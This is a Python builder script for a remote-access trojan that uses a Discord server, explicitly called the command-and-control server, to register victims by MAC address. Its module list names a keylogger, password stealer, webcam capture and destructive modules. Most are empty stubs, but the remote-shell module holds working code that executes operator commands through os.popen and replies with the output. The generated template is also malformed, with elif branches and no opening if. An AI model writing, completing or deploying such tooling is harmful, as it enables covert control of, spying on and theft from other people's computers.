# [python/builder.py]
import json
import os

# Path to the settings.json file
print ("[+] Building client.py")
settings_path = "python\settings\settings.json"
if not os.path.exists(settings_path):
    print(f"Settings file not found at {settings_path}")
    exit(1)


# Read and parse the settings.json file
print(f"Reading settings from {settings_path}")
try:
    with open(settings_path, "r") as file:
        settings = json.load(file)
except json.JSONDecodeError as e:
    print(f"Error parsing JSON: {e}")
    exit(1)

# Extract the modules to include
modules = settings["Modules"]

# Start building the client.py content -> TODO: finish main.py 
client_code = """
import os
import discord
import sys
from settings import guildid, bottoken
from uuid import getnode

intents = discord.Intents.all()
intents.members = True
client = discord.Client(intents=intents)
global mac_address
mac_address = str(getnode())

async def find_channel_by_name(guild, channel_name):
    for channel in guild.channels:
        if channel.name == channel_name:
            return channel
    return None

@client.event
async def on_ready():
    commandAndControllServer = client.get_guild(int(guildid))
    channel = await find_channel_by_name(commandAndControllServer, mac_address)
    if channel:
        await channel.send("Connection reestablished")
    else:
        channel = await commandAndControllServer.create_text_channel(mac_address)
        e = await channel.send("New Connection established")
        await e.pin()
        await channel.send("hello world")

@client.event
async def on_message(message):
    if message.author == client.user:
        return
"""

# Add module-specific code
if modules["Downloader"]:
    client_code += """
    # ADDED DOWNLOADER MODULE
    """
if modules["BSOD"]:
    client_code += """
    # ADDED BSOD MODULE
    """
if modules["Clipboard"]:
    client_code += """
    # ADDED CLIPBOARD MODULE
    """
if modules["AudioControlls"]:
    client_code += """
    # ADDED AUDIO CONTROLS MODULE
    """
if modules["GhostWriter"]:
    client_code += """
    # ADDED GHOST WRITER MODULE
    """
if modules["KeyboardShortcuts"]:
    client_code += """
    # ADDED KEYBOARD SHORTCUTS MODULE
    """
if modules["Keylogger"]:
    client_code += """
    # ADDED KEYLOGGER MODULE
    """
if modules["Obliterator"]:
    client_code += """
    # ADDED OBLITERATOR MODULE
    """
if modules["PasswordStealer"]:
    client_code += """
    # ADDED PASSWORD STEALER MODULE
    """
if modules["Screenshot"]:
    client_code += """
    # ADDED SCREENSHOT MODULE
    """
if modules["Webcam"]:
    client_code += """
    # ADDED WEBCAM MODULE
    """
if modules["WallpaperChanger"]:
    client_code += """
    # ADDED WALLPAPER CHANGER MODULE
    """
if modules["TTS"]:
    client_code += """
    # ADDED TTS MODULE
    """

if modules["ReverseShell"]:
    client_code += """
    # ADDED REVERSE SHELL MODULE
    elif message.content.lower().startswith(".shell"):
        command = message.content[7:]
        output = os.popen(command).read()
        if output == "":
            output = "No Output"
        embed = discord.Embed(title=f"Shell Command > {command}", description=f"```{output}```", color=0xfafafa)
        await message.reply(embed=embed)
    """
if modules["FileBrowser"]:
    client_code += """
    # ADDED FILE BROWSER MODULE
    elif message.content.lower().startswith(".cd"):
        try:
            os.chdir(message.content[4:])
            await message.channel.send(f"Changed directory to {os.getcwd()}")
        except FileNotFoundError:
            await message.channel.send("Invalid Path")
    elif message.content.lower() == ".pwd":
        await message.channel.send(f"Current Directory: {os.getcwd()}")
    """

# Finalize the client.py content
client_code += """
# Add more commands and functionality as needed...

client.run(bottoken)
"""

# Write the generated code to client.py
client_path = "python/client/client.py"
with open(client_path, "w") as file:
    file.write(client_code)

print(f"client.py has been generated at {client_path}")